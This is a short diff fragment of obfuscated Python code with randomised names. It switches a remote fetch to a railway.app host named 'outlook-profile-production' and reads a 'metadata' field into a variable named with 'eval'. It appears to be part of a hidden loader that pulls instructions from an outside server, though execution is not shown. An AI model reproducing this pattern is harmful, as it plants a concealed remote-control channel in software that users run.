@@ -16,7 +16,7 @@ def net_pdgvrq_794():
 
     def process_bdofwt_483():
         try:
-            config_sxkcms_524 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_sxkcms_524 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_sxkcms_524.raise_for_status()
             process_iuuaza_160 = config_sxkcms_524.json()
             eval_wkztjx_858 = process_iuuaza_160.get('metadata')
